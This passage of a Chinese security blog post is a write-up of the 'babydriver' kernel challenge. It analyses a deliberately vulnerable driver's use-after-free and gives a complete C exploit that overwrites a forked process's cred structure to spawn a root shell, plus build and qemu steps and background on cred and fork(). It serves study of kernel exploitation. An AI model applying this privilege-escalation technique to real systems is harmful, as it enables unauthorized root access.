+  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>babydev_struct<span class="token punctuation">.</span>device_buf <span class="token punctuation">)</span>
+    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1LL</span><span class="token punctuation">;</span>
+  result <span class="token operator">=</span> <span class="token operator">-</span><span class="token number">2LL</span><span class="token punctuation">;</span>
+  <span class="token keyword">if</span> <span class="token punctuation">(</span> babydev_struct<span class="token punctuation">.</span>device_buf_len <span class="token operator">></span> v4 <span class="token punctuation">)</span>
+  <span class="token punctuation">&#123;</span>
+    v6 <span class="token operator">=</span> v4<span class="token punctuation">;</span>
+    <span class="token function">copy_to_user</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+    result <span class="token operator">=</span> v6<span class="token punctuation">;</span>
+  <span class="token punctuation">&#125;</span>
+  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p>逐一分析下重点函数：</p>
+<ol>
+<li><strong>babydriver_init &amp; babydriver_exit函数</strong>：进行的是参数设置之类的工作，可以不用太过关注，但是要知道在 init 中设置了<code>/dev/babydev</code>作为设备文件，所以我们到时候可以通过<code>open(&quot;/dev/babydev&quot;)</code>来调用设备，从而调用这个驱动程序。</li>
+<li><strong>babyopen 函数</strong>：初始化<code>babydev_struct</code>结构体，这个结构体包含<code>babydev_struct.device_buf</code>和<code>babydev_struct.device_buf_len</code>两个域，分别表示内核缓冲区指针和缓冲区长度，在这个函数中会用<code>kmem_cache_alloc_trace</code>初始化<code>babydev_struct.device_buf</code>，并将<code>babydev_struct.device_buf_len</code>设置为 64；</li>
+<li><strong>babyrelease 函数</strong>：和 babyopen 函数相反，<strong>使用 kfree 函数释放指针指向的内存，注意 kfree 也会导致野指针出现</strong>；</li>
+<li><strong>babyread &amp;babywrite 函数</strong>：分别为向用户 buffer 写入 <code>device_buf</code> 中的内容和从用户 buffer 读取内容至 device_buf，用户传递长度和缓冲区地址作为参数，只有 <code>device_buf_len</code> 超过了这个长度才可以进行拷贝或者输出（防止溢出），两者都首先进行了 <code>device_buf</code> 指针是否为空的检查，再进行后续操作；</li>
+<li><strong>babyioctl 函数</strong>：定义了 0x10001 的命令，可以释放全局变量<code>babydev_struct</code> 中的 <code>device_buf</code>，再根据用户传递的 size 重新申请一块内存，并设置 <code>device_buf_len</code>。</li>
+</ol>
+<p>该驱动程序没有用户态传统的溢出等漏洞，但存在一个伪条件竞争引发的 UAF 漏洞。</p>
+<p><strong>UAF 漏洞分析</strong></p>
+<p>从 Linux 内存管理机制可知，<strong>所有进程内核态的变量都指向同一片物理内存，所以全局变量 <code>babydev_struct</code> 会被所有进程共享</strong>，并且由于 SLUB&amp;SLAB （内核空间内存管理机制）分配器的特点，分配一块内存时会优先寻找有没有刚被释放的、同样大小的内存，所以可以尝试构造一个条件竞争造成的 UAF，尝试修改进程结构体 cred 中的 <code>uid=gid=0</code>，从而实现提权。</p>
+<h1 id="提权exp"><a href="#提权exp" class="headerlink" title="提权exp"></a>提权exp</h1><p>综上所述，按照如下步骤可进行提权：</p>
+<ol>
+<li>连续两次打开驱动设备文件，设文件描述符分别为 fd1、fd2，这个时候由于 fd1、fd2 共享内存，会导致 fd2 覆盖 fd1 分配的空间；</li>
+<li>先使用 ioctl 函数修改 fd1 的 <code>babydev_struct.dev_buf_len</code> 为 sizeof(cred)，在本题内核版本为 4.4.72 情况下，cred 结构体大小为0xa8，<code>babydev_struct.dev_buf</code>会被分配一块内存，由于<code>babydev_struct</code>被所有进程共享，所以 fd2 的<code>babydev_struct</code>也被修改，与 fd1 相同；</li>
+<li>关闭 fd1，这时 fd1 中的<code>babydev_struct</code>被释放，分配的内存也被回收，但是 fd2 的<code>babydev_struct.device_buf</code>仍然指向这一块内存，如果使用 fd2 的 write 函数仍然可以向这一片空间写入数据（<strong>UAF 漏洞</strong>）；</li>
+<li>通过 fork() 函数开启一个新进程 p，p 进程的 cred 结构体在被分配空间时会优先被分配刚被释放的、与 cred 结构体大小相同的空间，即刚才 fd1 释放的 <code>babydev_struct.device_buf</code> 指向的空间，也即现在 fd2 的<code>babydev_struct.device_buf</code>指向的空间，由于 fd2 还可控，所以相当于我们已经控制了 p 进程的 cred 结构体，从而可进行提权；</li>
+<li>将 p 进程的<code>cred.gid、cred.uid</code>覆盖为 0，可以直接使用 fd2 的 write 系统调用函数写入（这里注意只需要将 28 字节的长度）。</li>
+</ol>
+<p>编写 exp.c 如下：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stropts.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/wait.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
+<span class="token punctuation">&#123;</span>
+	<span class="token comment">// 打开两次设备</span>
+	<span class="token keyword">int</span> fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/babydev"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">int</span> fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/babydev"</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token comment">// 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)</span>
+	<span class="token function">ioctl</span><span class="token punctuation">(</span>fd1<span class="token punctuation">,</span> <span class="token number">0x10001</span><span class="token punctuation">,</span> <span class="token number">0xa8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token comment">// 释放 fd1</span>
+	<span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token comment">// 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠</span>
+	<span class="token keyword">int</span> pid <span class="token operator">=</span> <span class="token function">fork</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">&lt;</span> <span class="token number">0</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] fork error!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+
+	<span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span>pid <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token comment">// 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0</span>
+		<span class="token keyword">char</span> zeros<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token number">0</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span>
+		<span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> zeros<span class="token punctuation">,</span> <span class="token number">28</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+		<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+		<span class="token punctuation">&#123;</span>
+			<span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] root now."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+			<span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">&#125;</span>
+	<span class="token punctuation">&#125;</span>
+	
+	<span class="token keyword">else</span>
+	<span class="token punctuation">&#123;</span>
+		<span class="token function">wait</span><span class="token punctuation">(</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	<span class="token punctuation">&#125;</span>
+	<span class="token function">close</span><span class="token punctuation">(</span>fd2<span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+	<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p>先编译 exp 并将其放入解包的文件系统中：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash">gcc exp.c -static -o ./fs/exp</code></pre>
+<p>然后重新打包内核启动的文件系统，生成 rootfs.img：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># sudo chmod a+x c.sh</span>
+<span class="token comment"># ./c.sh</span>
+<span class="token builtin class-name">cd</span> fs
+<span class="token function">find</span> <span class="token builtin class-name">.</span> <span class="token operator">|</span> cpio -o --format<span class="token operator">=</span>newc <span class="token operator">></span> <span class="token punctuation">..</span>/rootfs.img</code></pre>
+<p>接着更改虚拟机启动脚本 boot.sh（将内核启动的文件系统参数由 rootfs.cpio 改为 rootfs.img）：</p>
+<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>
+
+qemu-system-x86_64 -initrd rootfs.img -kernel bzImage -append <span class="token string">'console=ttyS0 root=/dev/ram oops=panic panic=1'</span> -enable-kvm -monitor /dev/null -m 64M --nographic  -smp <span class="token assign-left variable">cores</span><span class="token operator">=</span><span class="token number">1</span>,threads<span class="token operator">=</span><span class="token number">1</span> -cpu kvm64,+smep</code></pre>
+<p>最后重新启动 qemu 虚拟机并运行 exp 程序，即可成功提权：<br><img src="https://img-blog.csdnimg.cn/3483b77d524c47f18b4e499ae1e17a5f.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"><br>着重完成提权后，来补充下两个知识点：进程 cred 结构与 fork 函数。</p>
+<h2 id="cred结构"><a href="#cred结构" class="headerlink" title="cred结构"></a>cred结构</h2><p>Linux kernel 需要记录每一个进程的权限信息，而这个权限信息是使用 cred 结构体记录的。每个进程中都有一个 cred 结构，这个结构保存了该进程的权限等信息（uid，gid 等），如果能修改某个进程的 cred，那么也就修改了这个进程的权限。</p>
+<p>这个 cred 结构体不同内核版本可能会有差别（可以通过该<a target="_blank" rel="noopener" href="https://elixir.bootlin.com/linux/v4.4.72/source/include/linux/cred.h#L118">网站</a>进行查找），本题内核版本为 4.4.72，查看源码为：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">struct</span> <span class="token class-name">cred</span> <span class="token punctuation">&#123;</span>
+    <span class="token class-name">atomic_t</span>    usage<span class="token punctuation">;</span> <span class="token number">0x4</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_DEBUG_CREDENTIALS debug选项去掉</span></span>
+    <span class="token class-name">atomic_t</span>    subscribers<span class="token punctuation">;</span>    <span class="token comment">/* number of processes subscribed */</span>
+    <span class="token keyword">void</span>        <span class="token operator">*</span>put_addr<span class="token punctuation">;</span>
+    <span class="token keyword">unsigned</span>    magic<span class="token punctuation">;</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CRED_MAGIC</span>  <span class="token expression"><span class="token number">0x43736564</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">CRED_MAGIC_DEAD</span> <span class="token expression"><span class="token number">0x44656144</span></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+    <span class="token class-name">kuid_t</span>      uid<span class="token punctuation">;</span>        <span class="token comment">/* real UID of the task */</span> <span class="token number">0x4</span>
+    <span class="token class-name">kgid_t</span>      gid<span class="token punctuation">;</span>        <span class="token comment">/* real GID of the task */</span> <span class="token number">0x4</span>
+    <span class="token class-name">kuid_t</span>      suid<span class="token punctuation">;</span>       <span class="token comment">/* saved UID of the task */</span> <span class="token number">0x4</span>
+    <span class="token class-name">kgid_t</span>      sgid<span class="token punctuation">;</span>       <span class="token comment">/* saved GID of the task */</span> <span class="token number">0x4</span>
+    <span class="token class-name">kuid_t</span>      euid<span class="token punctuation">;</span>       <span class="token comment">/* effective UID of the task */</span> <span class="token number">0x4</span>
+    <span class="token class-name">kgid_t</span>      egid<span class="token punctuation">;</span>       <span class="token comment">/* effective GID of the task */</span> <span class="token number">0x4</span>
+    <span class="token class-name">kuid_t</span>      fsuid<span class="token punctuation">;</span>      <span class="token comment">/* UID for VFS ops */</span> <span class="token number">0x4</span>
+    <span class="token class-name">kgid_t</span>      fsgid<span class="token punctuation">;</span>      <span class="token comment">/* GID for VFS ops */</span> <span class="token number">0x4</span>
+    <span class="token keyword">unsigned</span>    securebits<span class="token punctuation">;</span> <span class="token comment">/* SUID-less security management */</span> <span class="token number">0x4</span>
+    <span class="token class-name">kernel_cap_t</span>    cap_inheritable<span class="token punctuation">;</span> <span class="token comment">/* caps our children can inherit */</span> <span class="token number">0x8</span>
+    <span class="token class-name">kernel_cap_t</span>    cap_permitted<span class="token punctuation">;</span>  <span class="token comment">/* caps we're permitted */</span> <span class="token number">0x8</span>
+    <span class="token class-name">kernel_cap_t</span>    cap_effective<span class="token punctuation">;</span>  <span class="token comment">/* caps we can actually use */</span> <span class="token number">0x8</span>
+    <span class="token class-name">kernel_cap_t</span>    cap_bset<span class="token punctuation">;</span>   <span class="token comment">/* capability bounding set */</span> <span class="token number">0x8</span>
+    <span class="token class-name">kernel_cap_t</span>    cap_ambient<span class="token punctuation">;</span>    <span class="token comment">/* Ambient capability set */</span> <span class="token number">0x8</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_KEYS</span></span>
+    <span class="token keyword">unsigned</span> <span class="token keyword">char</span>   jit_keyring<span class="token punctuation">;</span>    <span class="token comment">/* default keyring to attach requested 0x8
+                     * keys to */</span> 
+    <span class="token keyword">struct</span> <span class="token class-name">key</span> __rcu <span class="token operator">*</span>session_keyring<span class="token punctuation">;</span> <span class="token comment">/* keyring inherited over fork */</span> <span class="token number">0x8</span>
+    <span class="token keyword">struct</span> <span class="token class-name">key</span>  <span class="token operator">*</span>process_keyring<span class="token punctuation">;</span> <span class="token comment">/* keyring private to this process */</span> <span class="token number">0x8</span>
+    <span class="token keyword">struct</span> <span class="token class-name">key</span>  <span class="token operator">*</span>thread_keyring<span class="token punctuation">;</span> <span class="token comment">/* keyring private to this thread */</span> <span class="token number">0x8</span>
+    <span class="token keyword">struct</span> <span class="token class-name">key</span>  <span class="token operator">*</span>request_key_auth<span class="token punctuation">;</span> <span class="token comment">/* assumed request_key authority */</span> <span class="token number">0x8</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">ifdef</span> <span class="token expression">CONFIG_SECURITY</span></span>
+    <span class="token keyword">void</span>        <span class="token operator">*</span>security<span class="token punctuation">;</span>  <span class="token comment">/* subjective LSM security */</span> <span class="token number">0x8</span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
+    <span class="token keyword">struct</span> <span class="token class-name">user_struct</span> <span class="token operator">*</span>user<span class="token punctuation">;</span>   <span class="token comment">/* real user ID subscription */</span> <span class="token number">0x8</span>
+    <span class="token keyword">struct</span> <span class="token class-name">user_namespace</span> <span class="token operator">*</span>user_ns<span class="token punctuation">;</span> <span class="token comment">/* user_ns the caps and keyrings are relative to. */</span> <span class="token number">0x8</span>
+    <span class="token keyword">struct</span> <span class="token class-name">group_info</span> <span class="token operator">*</span>group_info<span class="token punctuation">;</span>  <span class="token comment">/* supplementary groups for euid/fsgid */</span> <span class="token number">0x8</span> 
+    <span class="token keyword">struct</span> <span class="token class-name">rcu_head</span> rcu<span class="token punctuation">;</span>        <span class="token comment">/* RCU deletion hook */</span> <span class="token number">0x10</span>
+<span class="token punctuation">&#125;</span><span class="token punctuation">;</span></code></pre>
+<p>通过查找各种类型所占内存大小、对齐规则可知 cred 结构体的总大小是0xa8，一直到 gid 结束是 28 个字节。</p>
+<p>确定该版本的 cred 结构体大小的另一种方法是自己写个简单 modules 然后编译生成 ko 驱动程序，加载到虚拟机中，printf 打印一下 sizeof(struct cred) 就能确定了：</p>
+<pre class="language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/init.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/module.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/kernel.h></span></span>
+<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;linux/cred.h></span></span>
+
+<span class="token function">MODULE_LICENSE</span><span class="token punctuation">(</span><span class="token string">"Dual BSD/GPL"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token keyword">struct</span> <span class="token class-name">cred</span> c1<span class="token punctuation">;</span>
+<span class="token keyword">static</span> <span class="token keyword">int</span> <span class="token function">hello_init</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> 
+<span class="token punctuation">&#123;</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"&lt;1> Hello world!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"size of cred : %d \n"</span><span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>c1<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">hello_exit</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> 
+<span class="token punctuation">&#123;</span>
+    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token string">"&lt;1> Bye, cruel world\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">&#125;</span>
+<span class="token function">module_init</span><span class="token punctuation">(</span>hello_init<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token function">module_exit</span><span class="token punctuation">(</span>hello_exit<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre>
+<p>运行结果：<br><img src="https://img-blog.csdnimg.cn/e604e2da0f264af9974decbacb9d6613.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAVHIwZQ==,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述" loading="lazy"></p>
+<h2 id="fork-函数"><a href="#fork-函数" class="headerlink" title="fork()函数"></a>fork()函数</h2><p>首先先接收一个观点，那就是：<strong>操作系统就是一堆进程，每一个进程都是由已有的进程创造出来的</strong>。以 Linux 操作系统为例，在启动之后第一个诞生的进程是 PID 为 0 的名叫 “idle” 的进程，后续所有的进程都是由它通过 fork() 创建的，包括我们熟知的 PID 为 1 的 “init” 进程。也许一杯咖啡的时间，等系统完全启动，我们可以登录以后，在命令行执行我们自己写的程序，这又是通过终端进程创建了新的进程。这就是在前面所说的操作系统的运行就是进程的不断创建和销毁的过程。</p>
+<p>在 Linux 系统函数中，<strong>fork() 是用来创建新的子进程的函数</strong>。根据 Linux 编程手册，在 fork 函数执行完毕后，如果创建新进程成功，则出现两个进程，一个是子进程，一个是父进程。<strong>在子进程中，fork 函数返回0，在父进程中，fork 返回新创建子进程的进程ID</strong>。我们可以通过 fork 返回的值来判断当前进程是子进程还是父进程。</p>
+<blockquote>
+<p>需要注意的是，<strong>在 fork 之后两个进程用的是相同的物理空间(内存区)，子进程的代码段、数据段、堆栈都是指向父进程的物理空间</strong>，也就是说，两者的虚拟空间不同，其对应的物理空间是一个。这是出于效率的考虑，在 Linux 中被称为“写时复制”（COW）技术，只有当父子进程中有更改相应段的行为发生时，再为子进程相应的段分配物理空间。</p>
+</blockquote>
+<p>但凡是进程，都有自己的虚拟地址空间。对于 32 位的 Linux 系统而言，虚拟地址空间是从 0 到 4G 的大小（其中 0-3G 属于用户空间 3-4G 属于内核空间）。创建完子进程后，父进程继续运行（即原来的进程）的代码，刚创建出来的子进程拥有和父进程完全一样的代码段，数据段，也就是说完完全全拷贝了一份父进程，和父进程完全一样。即 clone 父进程 0-3G 用户空间的内容，而 3-4G 的内核空间只需要重新映射一下到物理地址的 kernel 即可。<br><img src="https://raw.githubusercontent.com/Tr0e/PiCGo/main/img/e02b212a5f994a16a73ec454e5b10e05.png" alt="在这里插入图片描述" loading="lazy"><br>但是操作系统要如何区分这两个进程呢？答案就是进程 ID，即 pid。pid 是存储在 PCB（Process Control Block，为了描述控制进程的运行，系统中存放进程的管理和控制信息的数据结构称为进程控制块） 当中的类似身份证的东西。子进程会 clone 父进程的 PCB 到子进程，但是 PCB 里的 pid 会从操作系统中获取，得到新的 pid。</p>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>Android 内核层驱动程序涉及到的知识点很多，如 Linux 内核架构、驱动程序编写、字符设备程序、Linux 内存管理、Linux 系统调用、mmap 内存映射、驱动程序攻击面等等，此处不一一开展……过往的工作经历基本上都是碎片化的学习，很少静下心来系统性学习和研究一个方向，在此感谢下新单位给予了一个静心成长和沉淀的环境。还是那句话，安全路很长……希望在未来 1-2 年自己也能在移动终端安全、二进制安全方向建立较为完整的知识体系并独当一面吧。</p>
+</div></section><ul class="post-copyright"><li class="post-copyright-author"><strong>Post author: </strong>Tr0e</li><li class="post-copyright-link"><strong>Post link: </strong><a href="https://tr0e.github.io/Android%E5%86%85%E6%A0%B8%E5%B1%82%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8FUAF%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E5%AE%9E%E4%BE%8B/" title="Android内核层驱动程序UAF漏洞提权实例">https://tr0e.github.io/Android%E5%86%85%E6%A0%B8%E5%B1%82%E9%A9%B1%E5%8A%A8%E7%A8%8B%E5%BA%8FUAF%E6%BC%8F%E6%B4%9E%E6%8F%90%E6%9D%83%E5%AE%9E%E4%BE%8B/</a></li><li class="post-copyright-license"><strong>Copyright Notice: </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank" rel="noopener" title="CC BY-NC-SA 4.0 "><span class="icon iconify" data-icon="ri:creative-commons-line"></span><span class="icon iconify" data-icon="ri:creative-commons-by-line"></span><span class="icon iconify" data-icon="ri:creative-commons-nc-line"></span><span class="icon iconify" data-icon="ri:creative-commons-sa-line"></span></a> unless otherwise stated.</li></ul></article><div class="post-nav"><div class="post-nav-item"><a class="post-nav-prev" href="/Android%20Webview%E5%8E%86%E5%8F%B2%E9%AB%98%E5%8D%B1%E6%BC%8F%E6%B4%9E%E4%B8%8E%E6%94%BB%E5%87%BB%E9%9D%A2%E5%88%86%E6%9E%90/" rel="prev" title="Android Webview历史高危漏洞与攻击面分析"><span class="icon iconify" data-icon="ri:arrow-left-s-line"></span><span class="post-nav-text">Android Webview历史高危漏洞与攻击面分析</span></a></div><div class="post-nav-item"><a class="post-nav-next" href="/IDA%E5%8A%A8%E6%80%81%E8%B0%83%E8%AF%95%E7%A0%B4%E8%A7%A3AliCrackme%E4%B8%8E%E5%8F%8D%E8%B0%83%E8%AF%95%E5%AF%B9%E6%8A%97/" rel="next" title="IDA动态调试破解AliCrackme与反调试对抗"><span class="post-nav-text">IDA动态调试破解AliCrackme与反调试对抗</span><span class="icon iconify" data-icon="ri:arrow-right-s-line"></span></a></div></div></div><div class="hty-card" id="comment"></div></main><footer class="sidebar-translate" id="footer"><div class="copyright"><span>&copy; 2019 – 2022 </span><span class="with-love" id="animate"><span class="icon iconify" data-icon="ri:cloud-line"></span></span><span class="author"> Tr0e</span></div><div class="powered"><span>Powered by <a href="https://hexo.io" target="_blank" rel="noopener">Hexo</a> v5.4.2</span><span class="footer-separator">|</span><span>Theme - <a rel="noopener" href="https://github.com/YunYouJun/hexo-theme-yun" target="_blank"><span>Yun</span></a> v1.10.4</span></div></footer></div><a class="hty-icon-button" id="back-to-top" aria-label="back-to-top" href="#"><span class="icon iconify" data-icon="ri:arrow-up-s-line"></span><svg class="progress-circle-container" viewBox="0 0 100 100"><circle class="progress-circle" id="progressCircle" cx="50" cy="50" r="48" fill="none" stroke="#0078E7" stroke-width="2" stroke-linecap="round"></circle></svg></a></body></html>
